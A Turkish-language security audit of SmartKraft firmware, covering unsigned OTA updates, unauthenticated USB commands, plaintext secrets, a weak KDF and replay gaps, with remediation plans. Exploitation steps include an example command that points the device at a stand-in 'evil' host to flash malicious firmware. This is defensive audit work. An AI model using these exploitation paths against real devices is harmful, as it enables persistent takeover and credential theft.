# SmartKraft Cihaz Firmware — Güvenlik Denetimi

> **Kapsam:** SynDimm (`SynDimm/Code/neue`), paylaşılan `sk_core`/`sk_api`
> (byte-eş olarak BlockingFocus ve LebensSpur'a da girer — çapraz-aile
> bulguları **[HER 3]** ile işaretli). Denetim üç bağımsız derin-okuma turuyla
> yapıldı; bulgular kaynak satırlarıyla verilir.
>
> **Durum (2026-07-03):** Bu bir DENETİM RAPORUDUR. Aşağıdaki ciddi bulguların
> çoğu (Secure Boot, flash/NVS şifreleme, OTA imzalama) **tek-yönlü donanım
> kararları** (eFuse yakma geri alınamaz) veya **paylaşılan sk_core** (VENDORED
> kuralı: değişiklik önce BF'de derlenip test edilmeli) ve **gerçek cihazda
> doğrulama** gerektirir. Bu nedenle otonom oturumda tek taraflı **kod
> değişikliği YAPILMADI** — her biri, kararı size ait olan bir remediation
> planı olarak listelenir. "Kapatma" donanım oturumunda, gerçek cihazla
> uçtan-uca doğrulanarak yapılmalıdır.
>
> **Temel mimari gerçek:** Dispatch'te kimlik doğrulamayı kontrol eden TEK
> kapı `requires_auth`'tır (`sk_core/src/sk_cli.c:503-508`). `critical`
> bayrağı YALNIZCA confirm-token akışını tetikler — kimlik doğrulaması İSTEMEZ.
> USB transport her satırı kimlik-doğrulamasız dispatch eder
> (`sk_transport_usb.c:195`). BLE/TCP, CLI dispatch öncesi karşılıklı
> challenge-response ister (doğru).

---

## KRİTİK

### C1 · OTA imzasız firmware flash'ler; custom-URL yolu SHA256'yı da atlar; Secure Boot kapalı — **[HER 3]**
- **Dosyalar:** `sk_core/src/sk_ota.c:425-453` (`sk_ota_start`), `:433-437`
  (`custom_url` → `verify_sha256=false`), `:266-273`+`:396-404` (SHA256 URL ile
  AYNI manifest'ten alınır), `:516-534` (`cmd_ota_start` = `critical`, **değil**
  `requires_auth`); `sdkconfig`: `CONFIG_SECURE_BOOT is not set`,
  `CONFIG_SECURE_FLASH_ENC_ENABLED is not set`,
  `CONFIG_BOOTLOADER_APP_ANTI_ROLLBACK is not set`.
- **Mekanizma:** Kod-imzalama / Secure Boot yok. Tek bütünlük kontrolü,
  saldırganın kontrol ettiği manifest'ten gelen SHA256 (bütünlük ≠ özgünlük).
  `ota.update --url <x>` override yolu SHA256'yı tamamen devre dışı bırakır ve
  herhangi bir URL'yi indirip flash'ler. Bootloader imzasız imajı boot eder.
- **İstismar:** Bağlı herhangi bir peer (veya kopyalanmış bond anahtarı olan —
  bkz. H4) BLE/TCP'den `ota.update --url https://evil/impl.bin` gönderir; cihaz
  confirm-token üretir, saldırgan tekrar gönderir, cihaz kötü niyetli
  firmware'i flash'leyip boot eder = kalıcı RCE / tam ele geçirme. TLS
  yardımcı olmaz (saldırgan kendi host'unda geçerli sertifika kullanır).
  Anti-rollback yok → `ota.rollback` ile bilinen-açıklı bir sürüme downgrade.
- **Remediation (donanım + ürün kararı):** (a) Secure Boot v2 + Flash
  Encryption'ı etkinleştir (**eFuse yakma — GERİ ALINAMAZ**, imalat/anahtar
  yönetimi kararı); (b) OTA imajını release imzalama anahtarıyla imzala,
  firmware'de imzayı doğrula; (c) `custom_url` SHA256-atlama yolunu kaldır ya
  da yalnız kimlikli+imza-doğrulamalı yap; (d) `ota.update`/`ota.rollback`'ı
  `requires_auth` yap; (e) anti-rollback etkinleştir.

---

## YÜKSEK

### H1 · `critical` komutlar kimlik-doğrulamasız; USB kimlik-doğrulamasız dispatch — **[HER 3]**
- **Dosyalar:** `sk_cli.c:503-508` (kapı yalnız `requires_auth` bakar),
  `:585-598` & `:650-684` (confirm-token, auth'tan bağımsız üretilir),
  `sk_transport_usb.c:195` (`authenticated=false`), `sk_auth.c:1052-1079`
  (`device.confirm-token` ne `requires_auth` ne `critical`).
- **Mekanizma:** USB'de ctx kimlik-doğrulamasız; `requires_auth` komutlar
  bloklanır (iyi) ama her `critical`-yalnız komut, otomatik confirm-token
  turundan sonra çalışır. Confirm-token kimlik-doğrulamasız çağırana verilebilir.
- **İstismar (USB, fiziksel):** `device.factory-reset`, `ota.update --url` (→C1),
  `config.import` (→H2), `ble.unpair`, `auth.token.rotate`, `wifi.forget`,
  `wifi.connect` (rogue AP'ye kat). Secure Boot kapalı olduğundan fiziksel USB
  → kalıcı implant.
- **Remediation (sk_core, BF-first + donanım testi):** `critical` komutları da
  `requires_auth` yap VEYA en azından USB ctx'e ayrı bir "fiziksel-yerel"
  yetki seviyesi tanımla ve yıkıcı komutları (factory-reset/ota/config.import)
  kimlikli kanala kısıtla.

### H2 · `config.import` kimlik-doğrulamasız (SynDimm)
- **Dosyalar:** `sd_mode_engine/src/sd_config_io.c:249-252` (`config.import` =
  yalnız `critical`), `:179-243` (handler), `:246-248` (`config.export` HİÇ
  kapısız). `safe` bölümü doğru şekilde `sk_cli_is_authenticated` ile korunur
  (`:228-235`) ama diğer her şey değil.
- **İstismar:** USB saldırganı bir mod slotunu saldırgan MQTT/HTTP hedefine
  yeniden bağlayan config import eder, cihaz otomatik reboot eder.
- **Remediation (SynDimm — donanım E2E testi):** `config.import`'u tümüyle
  `requires_auth` yap (safe.set zaten öyle — tutarlılık). NOT: bu, SKAPP'in
  kimlikli BLE/TCP yolunu bozmaz ama USB admin-import'unu kapatır; USB'den
  yönetim isteniyorsa ürün kararı.

### H3 · `config.export` / `mode.get` hedef kimlik bilgilerini (`auth_key`) düz metin, kapısız sızdırır (SynDimm)
- **Dosyalar:** `sd_config_io.c:60-74` (`export_slots` tam binding'i
  `targets[].auth_key` dahil döker), `:246-248` (kapısız); `sd_mode_cli.c:74-106`
  (`mode.get` tam binding döner, kapısız); `sd_binding.c:78` (auth_key ≤127).
- **İstismar:** USB saldırganı `config export` / `mode get 1` ile her hedef
  cihazın `auth_key`'ini düz metin okur.
- **Remediation (SynDimm — SKAPP ile bağlaşık, donanım E2E):** İki seçenek:
  (a) `config.export`/`mode.get`'i `requires_auth` yap (SKAPP kimlikli kanaldan
  çalışır, USB okuması kapanır); (b) auth_key'i çıktıda redakte et
  (`"***"`) — DİKKAT: SKAPP mod-düzenleme ekranı mevcut auth_key'i geri okuyup
  koruyor (`sd_modes_screen.dart` `_authKey` ← `targets[].auth_key`); redaksiyon
  bu akışı değiştirir, ekran da güncellenmeli. (a) daha az bağlaşık.

### H4 · Sırlar düz metin saklanır; NVS/flash şifresiz; PBKDF2 iterasyonu çok düşük — **[HER 3]**
- **Dosyalar:** `sdkconfig`: `CONFIG_NVS_ENCRYPTION is not set`,
  `CONFIG_SECURE_FLASH_ENC_ENABLED is not set`; `sk_auth.c:96-104` (bond
  `bond_key` NVS blob'una düz paketlenir); `sk_passphrase.h:50`
  (`PBKDF2_ITERS 600`), `:37` (`MIN_LEN 6`); `sd_safe_store.c:123-133` (safe
  dizisi düz JSON olarak kalıcı).
- **Mekanizma:** Fiziksel flash/chip okuması tüm 8 bond anahtarını (her
  telefonu taklit et / oturum sahtele), passphrase salt+hash'ini (600 iter +
  6-karakter min = önemsiz offline crack), her safe dizisini ve her hedef
  auth_key'ini kurtarır. Flash-enc/Secure Boot SoC'ta destekli (`SOC_SECURE_BOOT_V2`)
  ama kapalı.
- **Remediation (donanım/ürün):** (a) Flash Encryption + NVS Encryption
  (Secure Boot ile birlikte, C1); (b) `PBKDF2_ITERS`'ı ≥100k yap, `MIN_LEN`'i
  ≥8; (c) mümkünse bond anahtarlarını HMAC-türetilmiş sarmalayıcıyla sakla.

---

## ORTA

### M1 · Confirm-token komuta veya oturuma bağlı değil — **[HER 3]**
- **Dosya:** `sk_auth_confirm.c:56-69` (`consume` tek global 4-slot havuzda
  herhangi bir canlı token'ı eşler; komut adı/oturum/peer bağı yok),
  `:29-54` (üretim). Token 128-bit rastgele, tek-kullanım, 30 sn TTL (iyi) ama
  herhangi bir canlı token herhangi bir kritik komutu herhangi bir kanalda
  yetkilendirir.
- **İstismar:** Zararsız bir onay (SKAPP "restart onayla") için üretilen token,
  30 sn içinde paralel bir `factory-reset`/`ota.update`/`config.import` ile
  tüketilebilir.
- **Remediation (sk_core, BF-first):** Token'ı üretildiği komut adına + oturum
  kimliğine (peer_id/transport) bağla; `consume` her ikisini de doğrulasın.

### M2 · Pairing penceresi fiziksel yakınlık gerektirmez; passphrase yoksa LAN'dan rogue bond
- **Dosyalar:** `sk_auth.c:978-991` (`pairing.start` — ne `requires_auth` ne
  `critical`), `:1126-1130` (bond yoksa boot'ta 60 sn otomatik açılır),
  `:653-705` (passphrase yoksa anında bond commit); `sk_transport_tcp.c:129-156`
  & `:67-88` (pencere açıkken TCP/LAN'dan `pairing.ecdh.exchange` kabul).
- **İstismar:** Cihazı WiFi'de resetle (veya bağlı peer `pairing.start` çağırır)
  → LAN'daki saldırgan host bir `pairing.ecdh.exchange` gönderir → tam bond
  slotu + oturum erişimi. TCP'de yakınlık şartı YOK.
- **Remediation (sk_core/ürün):** (a) Fabrika passphrase'i zorunlu kıl
  (varsayılan-passphrase-yok riski en büyük faktör); (b) `pairing.start`'ı
  `requires_auth` yap (uzak yeniden-açmayı engelle); (c) TCP pairing'i devre
  dışı bırak ya da fiziksel-onay (düğme) iste — SynDimm'in "5 sn reboot"
  pairing modeli zaten fiziksel; TCP exchange'i o pencereye kısıtla.

### M3 · Replay-guard bypass: nonce 0 ve saat-kurulmadan penceresi — **[HER 3]**
- **Dosyalar:** `sk_auth_hmac.c:44-50` (`nonce_seen` n==0 için false döner →
  nonce 0 asla "görülmüş" olmaz), `:96-100` (duvar-saati >2023 olana dek
  timestamp kontrolü tamamen atlanır), `:26-34`+`sk_secure_session.c:151`
  (64-girişli global nonce ring, her handshake'te sıfırlanır).
- **Mekanizma:** `nonce==0` taşıyan yakalanmış imzalı zarf süresiz replay
  edilebilir. `time.set` öncesi replay koruması yalnız 64-girişli ring; her
  yeniden-handshake'te silinir. HMAC 128-bit ve sabit-zaman karşılaştırmalı
  (sahtelenemez) → istismar kimlikli konum gerektirir, etki sınırlı.
- **Remediation (sk_core, BF-first):** (a) nonce 0'ı geçersiz say (üretimde
  1'den başlat, doğrulamada 0'ı reddet); (b) saat kurulana kadar da monotonik
  bir sayaç/pencere uygula; (c) ring boyutunu artır / oturum başına ayır.

---

## DÜŞÜK / BİLGİ

- **L1 · Hedef iletişimi düz HTTP ve genişletilmiş URL loglanır** —
  `sd_proto_http.c:86` (`http://`), `:110` (`ESP_LOGI` genişletilmiş URL).
  `{auth_key}` URL'ye templatelenmişse INFO'da loglanır ve LAN'da düz metin
  gider. Yapılandırmaya bağlı. **[HER 3 loglama deseni]**. *Remediation
  (SynDimm, güvenli+küçük):* URL log'unu host/path ile sınırla (query'yi
  düşür) veya DEBUG seviyesine indir; `logs.get` ile sır çekilmesini kapat.
- **L2 · `mode.list` JSON'u `off += snprintf` ile `cap-off` clamp'siz üretir** —
  `sd_mode_cli.c:46-68`. Bugün güvenli (SD_MODE_SLOTS=3, alanlar sınırlı, buffer
  1024) ama kod başka yerde tam bu deseni koruyor (`sk_auth.c:544-565`,
  `sk_cli.c:200`). *Remediation:* savunmacı `cap-off` clamp ekle.
- **L3 · `auth.passphrase.*` 10-yanlış-lockout uzak/USB factory-reset DoS'u** —
  `sk_passphrase.c:305-317`. Tasarım (fail-secure) ama bağlı/USB saldırgan
  yanlış passphrase besleyerek wipe zorlayabilir. *Remediation:* lockout'u wipe
  yerine artan gecikmeye (backoff) çevir; wipe'ı yalnız fiziksel-onaylı yap.

---

## TEMİZ DOĞRULANDI (kontrol edildi, sorun yok)

- **F1 · Safe-dizi gizliliği çalışma-zamanında DOĞRU.** `safe.list` yalnız
  `segments` sayısı döner, diziyi asla (`sd_safe_store.c:216-231`);
  `config.export` `"safe":"omitted"` (`sd_config_io.c:103`); hiçbir yol ham
  diziyi loglamaz/event etmez (`drv_safe.c` yalnız `n`/`ok`/`seconds` yayınlar);
  `sd_seq_format` hiçbir çıktı yolunda çağrılmaz. (Fiziksel-erişim sızıntısı
  H4'tür, çalışma-zamanı sızıntısı değil.)
- **F2 · HMAC oturum zarfı** — 128-bit truncated HMAC-SHA256, sabit-zaman
  karşılaştırma, fail-closed, anahtarlar silinir; BLE/TCP tüm auth-öncesi
  handshake-dışı satırları reddeder.
- **F3 · Passphrase** — PBKDF2-SHA256, 16-byte salt, 32-byte hash, sabit-zaman;
  düz metin loglanmaz. Tek zayıflık 600-iterasyon (H4).
- **F4 · Parser'lar** `sd_sequence.c` (sınır-kontrollü, `MAX_TICKS 50`<int8),
  `sd_binding.c`, `sd_profiles.c`, `sd_template.c` (`append()` NUL-güvenli) —
  güvenilmez girdide overflow/off-by-one/format-string yok; BLE write chunk 512
  ile sınırlı.

---

## Öncelikli remediation planı

| Öncelik | Bulgu | Sınıf | Kim/Nasıl |
|---|---|---|---|
| **P0** | C1 OTA imzasız + Secure Boot kapalı | Kritik | **Ürün kararı + eFuse (geri alınamaz) + donanım** |
| **P0** | H4 flash/NVS şifresiz + zayıf PBKDF2 | Yüksek | Ürün kararı (flash-enc) + sk_core (iter/min-len) |
| **P1** | H1 critical komutlar auth'suz + USB | Yüksek | sk_core, BF-first + donanım testi |
| **P1** | H2 config.import auth'suz | Yüksek | SynDimm, donanım E2E |
| **P1** | H3 auth_key kapısız sızıntı | Yüksek | SynDimm + SKAPP, donanım E2E |
| **P1** | M2 passphrase'siz LAN pairing | Orta→Yük. | Ürün (zorunlu passphrase) + sk_core |
| **P2** | M1 confirm-token bağsız | Orta | sk_core, BF-first |
| **P2** | M3 nonce-0 / saat-öncesi replay | Orta | sk_core, BF-first |
| **P3** | L1 auth_key log'da | Düşük | SynDimm (güvenli+küçük — ilk uygulanabilir) |
| **P3** | L2 snprintf clamp; L3 lockout DoS | Düşük | SynDimm / sk_core |

**Değerlendirme:** Kriptografik çekirdek (ECDH, HMAC zarfı, passphrase KDF,
parser güvenliği, çalışma-zamanı safe-dizi gizliliği) **sağlam ve doğru**.
Açıklar iki eksende: (1) **at-rest/donanım güvenliği kapalı** (Secure Boot,
flash/NVS şifreleme, OTA imzalama — hepsi ürün-seviyesi, tek-yönlü kararlar),
ve (2) **yetki kapısı tutarsızlığı** (`critical` ≠ `requires_auth`;
config.import/export/mode.get gate eksikleri; pairing yakınlık şartı yok —
sk_core BF-first, donanım testi ister). En kritik ürün kararı C1+H4: Secure
Boot + Flash Encryption + imzalı OTA. Bu üçü olmadan fiziksel/USB erişim kalıcı
implant'a, flash okuması tüm sırlara ulaşır.

> Bu rapordaki hiçbir kod değişikliği otonom oturumda uygulanmadı; her madde
> gerçek cihazda doğrulanarak, tek-yönlü donanım kararları onaylandıktan sonra
> uygulanmalıdır.
